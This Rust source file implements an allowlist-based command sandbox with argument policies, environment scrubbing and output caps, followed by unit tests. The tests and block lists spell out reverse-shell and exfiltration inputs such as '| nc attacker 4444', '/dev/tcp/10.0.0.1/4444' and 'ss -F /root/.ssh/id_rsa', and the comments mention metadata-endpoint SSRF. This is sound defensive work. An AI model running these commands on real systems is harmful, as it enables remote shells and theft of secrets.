//! Sandbox — allowlist-based command execution with workspace scoping.

use std::process::Stdio;
use std::time::Duration;
use tokio::io::{AsyncRead, AsyncReadExt};
use tokio::process::Command;
use tokio::time::timeout;

/// Hard bounds on the caller-supplied timeout (seconds).
const MIN_TIMEOUT_SECS: u64 = 1;
const MAX_TIMEOUT_SECS: u64 = 300;

#[derive(Debug)]
pub struct ExecOutput {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    /// Whether stdout or stderr hit `MAX_OUTPUT` and was cut short.
    pub truncated: bool,
}

// Read-only system-inspection commands only. Network-egress tools (curl, wget,
// ping) are deliberately excluded — they enable SSRF (e.g. cloud metadata at
// 169.254.169.254) and data exfiltration. `find` is excluded because `-exec`
// turns it into an arbitrary-command primitive, and `journalctl` can read broad
// host logs. Re-enable any of these only behind an explicit, arg-restricted
// policy (tracked for the 0.6 sandbox-enforcement work).
const DEFAULT_ALLOWED: &[&str] = &[
    "ls", "cat", "head", "tail", "wc", "grep", "df", "du", "uname", "hostname", "ip", "ss", "ps",
    "top", "free", "lsblk", "lscpu", "sensors",
];

const BLOCKED: &[&str] = &[
    "rm", "dd", "mkfs", "shutdown", "reboot", "poweroff", "halt", "init", "kill", "pkill", "mount",
    "fdisk", "iptables", "nft", // Reverse shell / network exfil tools
    "nc", "ncat", "socat", "telnet", "nmap", "bash", "sh", "zsh", "python", "python3", "perl",
    "ruby", "php", "lua", "node", "gcc", "cc", "make", "chmod", "chown",
];

const MAX_OUTPUT: usize = 1_048_576; // 1 MB

/// The child's whole environment. It inherits nothing: the edge's own
/// environment holds its API and registration tokens, LLM keys and
/// messaging credentials, which `cat /proc/self/environ` would print.
const CHILD_ENV: &[(&str, &str)] = &[
    (
        "PATH",
        "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    ),
    ("LANG", "C.UTF-8"),
    ("TERM", "dumb"),
];

/// Why `args` are refused for `command`, if they are. Several allowed tools
/// change the system or run programs through particular options: `ip netns
/// exec` runs any program (as root, a root shell), `ip link set ... down`
/// cuts the network, `ss -D FILE` writes (truncates) any file and `ss -K`
/// kills connections, `hostname NAME` renames the host and `sensors -s`
/// writes hardware limits. Those tools may only show.
fn arg_policy_error(command: &str, args: &[String]) -> Option<String> {
    match command {
        "hostname" => hostname_args(args),
        "ip" => ip_args(args),
        "ss" => ss_args(args),
        "sensors" => sensors_args(args),
        _ => None,
    }
}

/// `hostname` prints; given a name (or `-F`/`-b`) it sets one.
fn hostname_args(args: &[String]) -> Option<String> {
    const SHOW: &[&str] = &[
        "-a",
        "--alias",
        "-A",
        "--all-fqdns",
        "-d",
        "--domain",
        "-f",
        "--fqdn",
        "--long",
        "-i",
        "--ip-address",
        "-I",
        "--all-ip-addresses",
        "-s",
        "--short",
        "-h",
        "--help",
        "-V",
        "--version",
    ];
    args.iter()
        .find(|a| !SHOW.contains(&a.as_str()))
        .map(|a| format!("hostname argument not allowed: {a} (display options only)"))
}

/// `ip [OPTIONS] OBJECT [show|list ...]`, and `ip route get`. iproute2
/// accepts abbreviations (`ip l s` is `ip link set`), so the object and the
/// verb must be spelled out, and options that switch namespaces (`-n`,
/// `-all`), run command files (`-batch`) or force are refused.
fn ip_args(args: &[String]) -> Option<String> {
    const OPTIONS: &[&str] = &[
        "-4",
        "-6",
        "-0",
        "-s",
        "-stats",
        "-statistics",
        "-d",
        "-details",
        "-j",
        "-json",
        "-p",
        "-pretty",
        "-br",
        "-brief",
        "-c",
        "-color",
        "-o",
        "-oneline",
        "-h",
        "-human",
        "-human-readable",
        "-r",
        "-resolve",
    ];
    const OBJECTS: &[&str] = &[
        "address",
        "addr",
        "link",
        "route",
        "neigh",
        "neighbour",
        "neighbor",
        "rule",
        "maddress",
        "maddr",
    ];
    let mut rest = args.iter().map(String::as_str).peekable();
    while let Some(option) = rest.next_if(|a| a.starts_with('-')) {
        if !OPTIONS.contains(&option) {
            return Some(format!("ip option not allowed: {option}"));
        }
    }
    let object = rest.next()?;
    if !OBJECTS.contains(&object) {
        return Some(format!(
            "ip object not allowed: {object} (one of {})",
            OBJECTS.join(", ")
        ));
    }
    match rest.next() {
        None | Some("show" | "list") => None,
        Some("get") if object == "route" => None,
        Some(verb) => Some(format!(
            "ip {object} {verb} is not allowed (show and list only)"
        )),
    }
}

/// `ss` with options that only choose what is shown: not `-D`/`--diag`
/// (writes a file), `-K`/`--kill`, `-F`/`--filter` (reads a file) or
/// `-N`/`--net` (switches namespace).
fn ss_args(args: &[String]) -> Option<String> {
    const SHORT: &str = "hVHOnraloempiTsEZzb460tSudwxMB";
    // Options whose value may follow in the same argument (`-finet`).
    const SHORT_WITH_VALUE: &str = "fA";
    const LONG: &[&str] = &[
        "help",
        "version",
        "no-header",
        "oneline",
        "numeric",
        "resolve",
        "all",
        "listening",
        "options",
        "extended",
        "memory",
        "processes",
        "threads",
        "info",
        "tos",
        "cgroup",
        "summary",
        "events",
        "context",
        "contexts",
        "bpf",
        "ipv4",
        "ipv6",
        "packet",
        "tcp",
        "sctp",
        "udp",
        "dccp",
        "raw",
        "unix",
        "mptcp",
        "vsock",
        "tipc",
        "xdp",
        "inet-sockopt",
        "bound-inactive",
        "family",
        "query",
        "socket",
    ];
    for arg in args {
        if let Some(long) = arg.strip_prefix("--") {
            let name = long.split('=').next().unwrap_or_default();
            if !LONG.contains(&name) {
                return Some(format!("ss option not allowed: --{name}"));
            }
        } else if let Some(cluster) = arg.strip_prefix('-') {
            for c in cluster.chars() {
                if SHORT_WITH_VALUE.contains(c) {
                    break; // the rest is the option's value
                }
                if !SHORT.contains(c) {
                    return Some(format!("ss option not allowed: -{c}"));
                }
            }
        }
    }
    None
}

/// `sensors` prints; `-s`/`--set` writes the configured limits to hardware.
fn sensors_args(args: &[String]) -> Option<String> {
    args.iter()
        .find(|a| {
            a.as_str() == "--set" || (a.starts_with('-') && !a.starts_with("--") && a.contains('s'))
        })
        .map(|a| format!("sensors option not allowed: {a}"))
}

/// Read `r` to EOF, keeping at most `cap` bytes; the flag reports whether more
/// was available. Stops reading (and drops `r`) as soon as the cap is exceeded.
async fn read_capped<R: AsyncRead + Unpin>(r: R, cap: usize) -> std::io::Result<(Vec<u8>, bool)> {
    let mut buf = Vec::new();
    r.take(cap as u64 + 1).read_to_end(&mut buf).await?;
    let cut = buf.len() > cap;
    buf.truncate(cap);
    Ok((buf, cut))
}

pub struct SandboxManager {
    allowed: Vec<String>,
}

impl SandboxManager {
    pub fn new() -> Self {
        Self {
            allowed: DEFAULT_ALLOWED.iter().map(|s| s.to_string()).collect(),
        }
    }

    pub async fn execute(
        &self,
        command: &str,
        args: &[String],
        workspace: Option<&str>,
        timeout_secs: u64,
    ) -> Result<ExecOutput, String> {
        // The lists name programs, resolved on PATH. A caller-supplied path is
        // refused outright: `/tmp/x/ls` has an allowed basename but would run
        // whatever binary sits at that path.
        if command.is_empty()
            || !command
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
        {
            return Err("Command must be a bare program name (no path)".into());
        }

        // Check against blocklist
        if BLOCKED.contains(&command) {
            return Err(format!("Command blocked: {command}"));
        }

        // Check allowlist
        if !self.allowed.iter().any(|a| a == command) {
            return Err(format!("Command not allowed: {command}"));
        }

        // Validate workspace path (prevent traversal); use the *canonical* path as
        // the working directory so the check and the exec see the same target.
        let mut workdir: Option<std::path::PathBuf> = None;
        if let Some(ws) = workspace {
            let canonical =
                std::fs::canonicalize(ws).map_err(|e| format!("Invalid workspace: {e}"))?;
            if !canonical.starts_with("/tmp") && !canonical.starts_with("/home") {
                return Err("Workspace must be under /tmp or /home".into());
            }
            workdir = Some(canonical);
        }

        // Validate args don't contain path traversal or shell metacharacters.
        // (No shell is spawned, so this is defense-in-depth; the allowlist is the
        // primary control.)
        for arg in args {
            if arg.contains("..") {
                return Err("Path traversal detected in arguments".into());
            }
            if arg.contains('|')
                || arg.contains(';')
                || arg.contains('`')
                || arg.contains("$(")
                || arg.contains("${")
                || arg.contains("/dev/tcp")
                || arg.contains("mkfifo")
            {
                return Err("Shell metacharacter detected in arguments".into());
            }
        }

        if let Some(refusal) = arg_policy_error(command, args) {
            return Err(refusal);
        }

        let timeout_secs = timeout_secs.clamp(MIN_TIMEOUT_SECS, MAX_TIMEOUT_SECS);

        let mut cmd = Command::new(command);
        cmd.args(args)
            .env_clear()
            .envs(CHILD_ENV.iter().copied())
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(true);
        if let Some(dir) = &workdir {
            cmd.current_dir(dir);
        }

        let mut child = cmd.spawn().map_err(|e| format!("Execution failed: {e}"))?;
        let (Some(stdout), Some(stderr)) = (child.stdout.take(), child.stderr.take()) else {
            return Err("Execution failed: output pipes unavailable".into());
        };

        // Read at most MAX_OUTPUT bytes of each stream. A reader that hits the
        // cap returns and drops its pipe, so a runaway writer (`cat /dev/zero`)
        // dies of SIGPIPE instead of growing our buffer until the edge device
        // runs out of memory. The timeout bounds the rest: on expiry the future
        // is dropped and kill_on_drop kills the process — preventing an
        // unbounded blocking command (e.g. `tail -f`) from hanging.
        let run = async {
            let (out, err) = tokio::join!(
                read_capped(stdout, MAX_OUTPUT),
                read_capped(stderr, MAX_OUTPUT)
            );
            let status = child.wait().await;
            (out, err, status)
        };
        let (out, err, status) = match timeout(Duration::from_secs(timeout_secs), run).await {
            Ok(done) => done,
            Err(_) => return Err(format!("Command timed out after {timeout_secs}s")),
        };
        let (stdout, stdout_cut) = out.map_err(|e| format!("Execution failed: {e}"))?;
        let (stderr, stderr_cut) = err.map_err(|e| format!("Execution failed: {e}"))?;
        let status = status.map_err(|e| format!("Execution failed: {e}"))?;

        Ok(ExecOutput {
            // Lossy decoding copes with a multi-byte character cut at the cap
            // (the old `String::truncate` panicked there — fatal under
            // panic = "abort").
            stdout: String::from_utf8_lossy(&stdout).into_owned(),
            stderr: String::from_utf8_lossy(&stderr).into_owned(),
            exit_code: status.code().unwrap_or(-1),
            truncated: stdout_cut || stderr_cut,
        })
    }

    pub fn allowed_commands(&self) -> Vec<String> {
        self.allowed.clone()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allowed_commands_populated() {
        let sm = SandboxManager::new();
        let cmds = sm.allowed_commands();
        assert!(cmds.contains(&"ls".to_string()));
        assert!(cmds.contains(&"cat".to_string()));
        assert!(cmds.contains(&"grep".to_string()));
        assert!(cmds.len() >= 15);
    }

    #[test]
    fn egress_and_escape_tools_not_in_default_allowlist() {
        let sm = SandboxManager::new();
        let cmds = sm.allowed_commands();
        for forbidden in ["curl", "wget", "ping", "find", "journalctl"] {
            assert!(
                !cmds.contains(&forbidden.to_string()),
                "{forbidden} must not be in the default allowlist (SSRF/exfil/escape)"
            );
        }
    }

    fn strings(args: &[&str]) -> Vec<String> {
        args.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn tools_that_can_change_the_system_may_only_show() {
        let refused = |cmd: &str, args: &[&str]| arg_policy_error(cmd, &strings(args)).is_some();
        // ip: namespaces run programs, batches run command files, and
        // abbreviations hide mutating verbs.
        assert!(refused("ip", &["netns", "exec", "x", "sh", "-c", "id"]));
        assert!(refused("ip", &["-n", "x", "addr"]));
        assert!(refused("ip", &["-all", "netns", "exec", "id"]));
        assert!(refused("ip", &["-batch", "/tmp/cmds"]));
        assert!(refused("ip", &["-force", "-b", "/tmp/cmds"]));
        assert!(refused("ip", &["link", "set", "eth0", "down"]));
        assert!(refused("ip", &["l", "s", "eth0", "down"]));
        assert!(refused(
            "ip",
            &["addr", "add", "10.0.0.9/24", "dev", "eth0"]
        ));
        assert!(refused("ip", &["route", "flush", "table", "main"]));
        assert!(refused("ip", &["addr", "del", "10.0.0.9/24"]));
        // ss: -D writes a file, -K kills sockets, -F reads one.
        assert!(refused("ss", &["-D", "/etc/passwd"]));
        assert!(refused("ss", &["-tanD/tmp/x"]));
        assert!(refused("ss", &["--diag=/tmp/x"]));
        assert!(refused("ss", &["-K", "dport", "=", "22"]));
        assert!(refused("ss", &["--kill"]));
        assert!(refused("ss", &["-F", "/root/.ssh/id_rsa"]));
        assert!(refused("ss", &["-N", "other"]));
        // hostname NAME renames the host.
        assert!(refused("hostname", &["pwned"]));
        assert!(refused("hostname", &["-F", "/tmp/name"]));
        assert!(refused("hostname", &["-b", "x"]));
        // sensors -s writes limits.
        assert!(refused("sensors", &["-s"]));
        assert!(refused("sensors", &["-us"]));
        assert!(refused("sensors", &["--set"]));

        // Showing still works.
        for (cmd, args) in [
            ("ip", &["addr"][..]),
            ("ip", &["-br", "-4", "addr", "show", "dev", "eth0"]),
            ("ip", &["-s", "-s", "link", "list"]),
            ("ip", &["route", "get", "1.1.1.1"]),
            ("ip", &["-j", "neigh", "show"]),
            ("ip", &[]),
            ("ss", &["-tulpn"]),
            ("ss", &["-s"]),
            ("ss", &["-finet", "-A", "tcp", "state", "established"]),
            (
                "ss",
                &["--tcp", "--listening", "--numeric", "--family=inet6"],
            ),
            ("hostname", &[]),
            ("hostname", &["-I"]),
            ("hostname", &["--fqdn"]),
            ("sensors", &["-u"]),
            ("sensors", &["-j"]),
            ("ps", &["aux"]),
            ("cat", &["/proc/meminfo"]),
        ] {
            assert!(!refused(cmd, args), "{cmd} {args:?} should be allowed");
        }
    }

    #[tokio::test]
    async fn refused_arguments_never_run() {
        let sm = SandboxManager::new();
        let err = sm
            .execute("ss", &strings(&["-D", "/tmp/sy-edge-ss-dump"]), None, 5)
            .await
            .unwrap_err();
        assert!(err.contains("-D"), "{err}");
        assert!(!std::path::Path::new("/tmp/sy-edge-ss-dump").exists());
    }

    #[tokio::test]
    async fn commands_do_not_inherit_the_edge_environment() {
        let sm = SandboxManager::new();
        let out = sm
            .execute("cat", &strings(&["/proc/self/environ"]), None, 5)
            .await
            .unwrap();
        let mut names: Vec<&str> = out
            .stdout
            .split('\0')
            .filter(|v| !v.is_empty())
            .filter_map(|v| v.split_once('=').map(|(name, _)| name))
            .collect();
        names.sort_unstable();
        assert_eq!(names, ["LANG", "PATH", "TERM"], "{:?}", out.stdout);
    }

    #[tokio::test]
    async fn blocked_command_rejected() {
        let sm = SandboxManager::new();
        let result = sm.execute("rm", &[], None, 30).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("blocked"));
    }

    #[tokio::test]
    async fn unlisted_command_rejected() {
        let sm = SandboxManager::new();
        let result = sm.execute("ffmpeg", &[], None, 30).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("not allowed"));
    }

    #[tokio::test]
    async fn path_traversal_in_args_rejected() {
        let sm = SandboxManager::new();
        let result = sm
            .execute("ls", &["../../etc/passwd".to_string()], None, 30)
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("traversal"));
    }

    #[tokio::test]
    async fn allowed_command_executes() {
        let sm = SandboxManager::new();
        let result = sm.execute("uname", &["-s".to_string()], None, 30).await;
        assert!(result.is_ok());
        let output = result.unwrap();
        assert!(output.stdout.contains("Linux"));
        assert_eq!(output.exit_code, 0);
    }

    #[tokio::test]
    async fn ls_with_workspace() {
        let sm = SandboxManager::new();
        let result = sm.execute("ls", &[], Some("/tmp"), 30).await;
        assert!(result.is_ok());
        assert_eq!(result.unwrap().exit_code, 0);
    }

    #[tokio::test]
    async fn bad_workspace_rejected() {
        let sm = SandboxManager::new();
        let result = sm.execute("ls", &[], Some("/etc"), 30).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Workspace must be"));
    }

    #[tokio::test]
    async fn command_paths_rejected() {
        let sm = SandboxManager::new();
        // A path is never resolved against the lists: `/tmp/x/ls` has an
        // allowed basename but would run an arbitrary binary.
        for cmd in ["/usr/bin/rm", "/tmp/x/ls", "./ls", "../bin/ls", "ls ", ""] {
            let err = sm.execute(cmd, &[], None, 30).await.unwrap_err();
            assert!(err.contains("bare program name"), "{cmd:?}: {err}");
        }
    }

    #[tokio::test]
    async fn runaway_output_is_capped_without_buffering_it_all() {
        let sm = SandboxManager::new();
        // `cat /dev/zero` never ends on its own; the capped reader must cut it
        // off (SIGPIPE) well before the timeout rather than buffer forever.
        let started = std::time::Instant::now();
        let out = sm
            .execute("cat", &["/dev/zero".to_string()], None, 30)
            .await
            .unwrap();
        assert!(out.truncated);
        assert_eq!(out.stdout.len(), MAX_OUTPUT);
        assert!(started.elapsed() < Duration::from_secs(20));
    }

    #[tokio::test]
    async fn cap_inside_a_multibyte_character_does_not_panic() {
        // 0xE2 0x82 0xAC = '€'; cap after the first byte of the second one.
        let data = "€€".as_bytes();
        let (buf, cut) = read_capped(data, 4).await.unwrap();
        assert!(cut);
        assert_eq!(buf, &data[..4]);
        assert_eq!(String::from_utf8_lossy(&buf), "€\u{FFFD}");
    }

    #[tokio::test]
    async fn blocked_commands_comprehensive() {
        let sm = SandboxManager::new();
        for cmd in [
            "dd", "mkfs", "shutdown", "reboot", "kill", "mount", "iptables",
        ] {
            let result = sm.execute(cmd, &[], None, 30).await;
            assert!(result.is_err(), "{cmd} should be blocked");
        }
    }

    #[tokio::test]
    async fn stderr_captured() {
        let sm = SandboxManager::new();
        // ls a nonexistent path should produce stderr
        let result = sm
            .execute("ls", &["/nonexistent_path_xyz".to_string()], None, 30)
            .await;
        assert!(result.is_ok());
        let output = result.unwrap();
        assert!(!output.stderr.is_empty());
        assert_ne!(output.exit_code, 0);
    }

    #[tokio::test]
    async fn reverse_shell_tools_blocked() {
        let sm = SandboxManager::new();
        for cmd in [
            "nc", "ncat", "socat", "bash", "sh", "python3", "perl", "ruby", "php",
        ] {
            let result = sm.execute(cmd, &[], None, 30).await;
            assert!(result.is_err(), "{cmd} should be blocked");
        }
    }

    #[tokio::test]
    async fn shell_metacharacters_in_args_blocked() {
        let sm = SandboxManager::new();

        let result = sm
            .execute("ls", &["| nc attacker 4444".to_string()], None, 30)
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("metacharacter"));

        let result = sm.execute("ls", &["; bash -i".to_string()], None, 30).await;
        assert!(result.is_err());

        let result = sm
            .execute("cat", &["$(whoami)".to_string()], None, 30)
            .await;
        assert!(result.is_err());

        let result = sm.execute("cat", &["`id`".to_string()], None, 30).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn dev_tcp_in_args_blocked() {
        let sm = SandboxManager::new();
        let result = sm
            .execute("cat", &["/dev/tcp/10.0.0.1/4444".to_string()], None, 30)
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("metacharacter"));
    }

    #[tokio::test]
    async fn long_running_command_times_out() {
        let sm = SandboxManager::new();
        // `tail -f /dev/null` blocks forever; the 1s timeout must kill it.
        let result = sm
            .execute(
                "tail",
                &["-f".to_string(), "/dev/null".to_string()],
                None,
                1,
            )
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("timed out"));
    }
}
